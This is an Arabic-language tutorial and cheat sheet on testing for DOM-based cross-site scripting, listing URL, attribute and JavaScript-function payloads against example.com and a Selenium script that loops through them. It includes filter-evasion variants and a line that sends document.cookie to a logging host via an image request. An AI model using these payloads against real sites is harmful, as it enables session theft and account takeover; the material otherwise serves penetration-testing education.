{ #XSS_DOM  }
## الخطوات العملية للحقن المعتمدة على DOM-Based XSS
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات، على الرغم من أن DOM-Based XSS غالبًا لا يتطلب تدخل الخادم.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، مصادر JavaScript، وتغييرات DOM.
   - حدد مصادر الإدخال المحتملة (مثل `location.hash`، `location.search`، `document.referrer`، أو `window.name`) التي قد تُستخدم في JavaScript.

2. **تحديد مصادر الإدخال الخطرة**:
   - افحص شيفرة JavaScript في الصفحة (عبر أدوات المطورين أو عرض المصدر) لتحديد كيفية معالجة الإدخالات.
   - ابحث عن دوال أو خصائص خطرة مثل:
     - كتابة محتوى: `innerHTML`، `outerHTML`، `document.write`.
     - تنفيذ شيفرة: `eval`، `setTimeout`، `setInterval`، `Function`.
     - التلاعب بالسمات: `setAttribute`، `location.assign`.
   - تحقق من مصادر مثل `location.hash`، `location.search`، `document.location`، أو `window.name` التي تُمرر إلى هذه الدوال.

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript بسيطة في مصدر الإدخال (مثل `example.com/#javascript:alert('XSS')` أو `example.com/?param=<img src=x onerror=alert(1)>`).
   - جرب الحقن في سياقات مختلفة:
     - الهاش: `example.com/#alert('XSS')`
     - معلمات URL: `example.com/?search=<script>alert('XSS')</script>`
     - سمات العناصر: `example.com/#" onload="alert(1)`
   - استخدم حقن تتجنب فلاتر العميل (مثل تجنب وسوم `<script>` إذا تم تصفيتها).

4. **مراقبة الاستجابات**:
   - تحقق من نجاح الحقن بناءً على:
     - **نجاح (True)**: ظهور تنبيه (مثل `alert('XSS')`)، تسجيل رسالة في وحدة التحكم (مثل `console.log('XSS')`)، تغيير عنوان الصفحة، أو تغيير بصري.
     - **فشل (False)**: لا يحدث شيء، أو تظهر الشيفرة كنص عادي في DOM.
   - استخدم أدوات المطورين (F12) لتتبع تنفيذ JavaScript (مثل وضع نقاط توقف عبر Debugger) أو فحص تغييرات DOM.

5. **تجربة صيغ ومصادر مختلفة**:
   - إذا فشلت الحقنة (مثل `example.com/#alert('XSS')`)، جرب صيغًا أخرى (مثل `example.com/#javascript:alert(1)` أو `example.com/#eval('alert(1)')`).
   - اختبر مصادر إدخال أخرى (مثل `window.name` أو `document.referrer`).
   - جرب حقنًا بدون تنبيهات (مثل `example.com/#console.log('XSS')`) لتجنب إزعاج المستخدم.

6. **تأكيد النطاق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف نطاق التنفيذ (مثل `example.com/#alert(document.domain)`).
   - تحقق مما إذا كانت الثغرة في بيئة معزولة (مثل iframe أو sandbox).
   - إذا نجحت الحقن، جرب استخراج بيانات (مثل `example.com/#new Image().src='http://localhost?c='+document.cookie`) أو تنفيذ هجمات أكثر تعقيدًا.

---

## جميع المحاولات الممكنة للحقن المعتمدة على DOM-Based XSS
في الحقن المعتمدة على DOM-Based XSS، المحاولات تركز على التلاعب بمصادر إدخال العميل واستغلال دوال JavaScript الخطرة. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر تعديل URL أو مصادر العميل.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر تعديل مصادر الإدخال مثل `location.hash` أو `location.search` في المتصفح. الهدف هو تنفيذ JavaScript عبر DOM.

#### أ. الحقن عبر URL والهاش
استخدام `location.hash`، `location.search`، أو `document.location` لإدخال شيفرة JavaScript.
- **الحقن**: `#alert('XSS')`
  - **الإدخال**: `https://example.com/#alert('XSS')`
  - **كيف يعمل**: إذا استُخدمت قيمة `location.hash` في `eval` أو `innerHTML`، يُنفذ التنبيه.
  - **متى يُستخدم؟**: عندما يعالج JavaScript قيمة الهاش مباشرة.
- **الحقن**: `#javascript:alert('XSS')`
  - **الإدخال**: `https://example.com/#javascript:alert('XSS')`
  - **كيف يعمل**: يُنفذ كعنوان JavaScript إذا استُخدم في `location` أو `href`.
  - **متى يُستخدم؟**: لاختبار التلاعب بالعناوين.
- **الحقن**: `#console.log('XSS')`
  - **الإدخال**: `https://example.com/#console.log('XSS')`
  - **كيف يعمل**: يسجل "XSS" في وحدة التحكم إذا استُخدم في `eval`.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون تنبيه.
- **الحقن**: `#alert(document.domain)`
  - **الإدخال**: `https://example.com/#alert(document.domain)`
  - **كيف يعمل**: يعرض النطاق، مؤكدًا سياق التنفيذ.
  - **متى يُستخدم؟**: لتأكيد النطاق.
- **الحقن**: `?param=<img src=x onerror=alert('XSS')>`
  - **الإدخال**: `https://example.com/?param=<img src=x onerror=alert('XSS')>`
  - **كيف يعمل**: إذا استُخدمت `location.search` في `innerHTML`، يُنفذ التنبيه.
  - **متى يُستخدم؟**: لاختبار معلمات URL.
- **الحقن**: `#eval('alert(1)')`
  - **الإدخال**: `https://example.com/#eval('alert(1)')`
  - **كيف يعمل**: يُنفذ التنبيه عبر `eval` إذا استُخدمت قيمة الهاش.
  - **متى يُستخدم؟**: لاختبار الدوال الخطرة.
- **الحقن**: `#setTimeout('alert(\"XSS\")',0)`
  - **الإدخال**: `https://example.com/#setTimeout('alert(\"XSS\")',0)`
  - **كيف يعمل**: يُنفذ التنبيه عبر `setTimeout` إذا استُخدمت القيمة.
  - **متى يُستخدم؟**: لاختبار تنفيذ الشيفرة المؤخر.
- **الحقن**: `#Function('alert(\"XSS\")')()`
  - **الإدخال**: `https://example.com/#Function('alert(\"XSS\")')()`
  - **كيف يعمل**: يُنفذ التنبيه عبر باني `Function`.
  - **متى يُستخدم؟**: لتجاوز فلاتر العميل.

#### ب. الحقن عبر سمات العناصر
التلاعب بالسمات أو القيم التي تُستخدم في DOM.
- **الحقن**: `#" onload="alert('XSS')`
  - **الإدخال**: `https://example.com/#" onload="alert('XSS')`
  - **كيف يعمل**: يُغلق سمة HTML ويُنفذ التنبيه إذا استُخدمت القيمة في `innerHTML`.
  - **متى يُستخدم؟**: عند اختبار الخروج من السمات.
- **الحقن**: `#" onfocus="alert(1)" autofocus`
  - **الإدخال**: `https://example.com/#" onfocus="alert(1)" autofocus`
  - **كيف يعمل**: يُنفذ التنبيه عند تركيز العنصر إذا استُخدمت القيمة في حقل إدخال.
  - **متى يُستخدم؟**: في النماذج التفاعلية.
- **الحقن**: `#"><svg onload=alert('XSS')>`
  - **الإدخال**: `https://example.com/#"><svg onload=alert('XSS')>`
  - **كيف يعمل**: يخرج من سمة ويُنفذ التنبيه عند تحميل SVG.
  - **متى يُستخدم؟**: لاختبار إدخال وسوم HTML5.
- **الحقن**: `#" onclick="alert('XSS')`
  - **الإدخال**: `https://example.com/#" onclick="alert('XSS')`
  - **كيف يعمل**: يُنفذ التنبيه عند النقر إذا استُخدمت القيمة في `innerHTML`.
  - **متى يُستخدم؟**: لاختبار الأحداث التفاعلية.
- **الحقن**: `#" onerror="alert(1)" src=x`
  - **الإدخال**: `https://example.com/#" onerror="alert(1)" src=x`
  - **كيف يعمل**: يُنفذ التنبيه عند فشل تحميل مصدر.
  - **متى يُستخدم؟**: لاختبار أحداث الأخطاء.

#### ج. الحقن عبر دوال JavaScript
استخدام دوال JavaScript خطرة لتنفيذ الشيفرة.
- **الحقن**: `#eval('console.log(\"XSS\")')`
  - **الإدخال**: `https://example.com/#eval('console.log(\"XSS\")')`
  - **كيف يعمل**: يسجل "XSS" في وحدة التحكم عبر `eval`.
  - **متى يُستخدم؟**: عندما تستخدم الصفحة `eval` لمعالجة الإدخال.
- **الحقن**: `#setTimeout('console.log(\"XSS\")',0)`
  - **الإدخال**: `https://example.com/#setTimeout('console.log(\"XSS\")',0)`
  - **كيف يعمل**: يسجل "XSS" عبر `setTimeout`.
  - **متى يُستخدم؟**: لاختبار التنفيذ المؤخر.
- **الحقن**: `#setInterval('alert(\"XSS\")',1000)`
  - **الإدخال**: `https://example.com/#setInterval('alert(\"XSS\")',1000)`
  - **كيف يعمل**: يُنفذ التنبيه بشكل متكرر عبر `setInterval`.
  - **متى يُستخدم؟**: لاختبار التنفيذ المتكرر.
- **الحقن**: `#new Function('alert(\"XSS\")')()`
  - **الإدخال**: `https://example.com/#new Function('alert(\"XSS\")')()`
  - **كيف يعمل**: يُنفذ التنبيه عبر باني `Function`.
  - **متى يُستخدم؟**: لتجاوز قيود `eval`.
- **الحقن**: `#document.write('<script>alert(\"XSS\")</script>')`
  - **الإدخال**: `https://example.com/#document.write('<script>alert(\"XSS\")</script>')`
  - **كيف يعمل**: يكتب وسم `<script>` في DOM.
  - **متى يُستخدم؟**: عند استخدام `document.write` للإدخال.

#### د. حقن بدون تنبيهات
استخدام حقن لتأكيد التنفيذ دون تنبيهات.
- **الحقن**: `#console.log('XSS: ' + document.domain)`
  - **الإدخال**: `https://example.com/#console.log('XSS: ' + document.domain)`
  - **كيف يعمل**: يسجل النطاق في وحدة التحكم.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون إزعاج.
- **الحقن**: `#document.title='XSS'`
  - **الإدخال**: `https://example.com/#document.title='XSS'`
  - **كيف يعمل**: يغير عنوان الصفحة إلى "XSS".
  - **متى يُستخدم؟**: لتأكيد التنفيذ بتغيير بصري.
- **الحقن**: `#document.body.style.background='red'`
  - **الإدخال**: `https://example.com/#document.body.style.background='red'`
  - **كيف يعمل**: يغير لون الخلفية إلى الأحمر.
  - **متى يُستخدم؟**: لتأكيد التنفيذ بتغيير بصري.
- **الحقن**: `#new Image().src='http://localhost/log?c='+document.domain`
  - **الإدخال**: `https://example.com/#new Image().src='http://localhost/log?c='+document.domain`
  - **كيف يعمل**: يرسل النطاق إلى خادم خارجي.
  - **متى يُستخدم؟**: لتأكيد التنفيذ مع إرسال بيانات.
- **الحقن**: `#console.error('XSS')`
  - **الإدخال**: `https://example.com/#console.error('XSS')`
  - **كيف يعمل**: يسجل خطأ في وحدة التحكم.
  - **متى يُستخدم؟**: لتأكيد التنفيذ عبر وحدة التحكم.

#### هـ. الحقن عبر مصادر أخرى
استخدام مصادر إدخال أخرى مثل `window.name` أو `document.referrer`.
- **الحقن**: `window.name=alert('XSS')`
  - **الإدخال**: نفّذ في وحدة التحكم أو عبر صفحة وسيطة: `window.name="alert('XSS')"`, ثم انتقل إلى `https://example.com`.
  - **كيف يعمل**: إذا استُخدمت `window.name` في `eval`، يُنفذ التنبيه.
  - **متى يُستخدم؟**: عندما تستخدم الصفحة `window.name`.
- **الحقن**: `document.referrer=javascript:alert('XSS')`
  - **الإدخال**: قم بإنشاء صفحة وسيطة ترسل المستخدم إلى `https://example.com` مع `referrer` معدل.
  - **كيف يعمل**: إذا استُخدم `document.referrer` في DOM، يُنفذ التنبيه.
  - **متى يُستخدم؟**: عند استخدام `referrer` كمصدر.
- **الحقن**: `#document.cookie`
  - **الإدخال**: `https://example.com/#document.cookie`
  - **كيف يعمل**: إذا استُخدمت القيمة في `innerHTML`، قد يُظهر ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لاختبار استخراج البيانات.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests`) لأتمتة اختبار مجموعة من الحقن المعتمدة على DOM-Based XSS وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستهدف مصادر DOM.
  - مثال قائمة:
    ```
    #alert('XSS')
    #javascript:alert('XSS')
    #console.log('XSS')
    #eval('alert(1)')
    ?param=<img src=x onerror=alert('XSS')>
    #" onload="alert('XSS')
    ```
- **كيف يعمل**:
  - يتم إرسال كل حقنة عبر URL أو تعديل مصادر العميل.
  - يتم تحليل الاستجابة في المتصفح (يدويًا أو عبر أدوات مثل Selenium) لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع Selenium لمحاكاة المتصفح):
  ```python
  from selenium import webdriver

  url = "https://example.com/#"
  payloads = [
      "alert('XSS')",
      "javascript:alert('XSS')",
      "console.log('XSS')",
      "eval('alert(1)')",
      "setTimeout('alert(\"XSS\")',0)",
      "document.title='XSS'"
  ]

  driver = webdriver.Chrome()
  for payload in payloads:
      driver.get(url + payload)
      try:
          alert = driver.switch_to.alert
          print(f"نجاح: {payload}")
          alert.accept()
      except:
          print(f"فشل: {payload}")
  driver.quit()
  ```
- **كيف يعمل**:
  - يفتح كل URL مع الحقنة في المتصفح.
  - يتحقق من وجود تنبيه أو تغييرات في DOM لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لـ DOM-Based XSS.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **تنبيهات**: ظهور تنبيه يشير إلى نجاح.
    - **وحدة التحكم**: تسجيل رسائل أو أخطاء.
    - **تغييرات DOM**: تغيير العنوان، الخلفية، أو المحتوى.
  - مثال: إذا أعادت `#alert('XSS')` تنبيهًا، فهي ناجحة.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية بسرعة.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `#document.write('<script>alert(1)</script>')` أو `#console.error('XSS')`).
  - جرب مصادر أخرى (مثل `window.name` أو `document.referrer`).
  - اختبر دمج الحقن مع وسوم HTML5 (مثل `#"><svg onload=alert('XSS')>`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `#setInterval('alert(\"XSS\")',1000)` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---

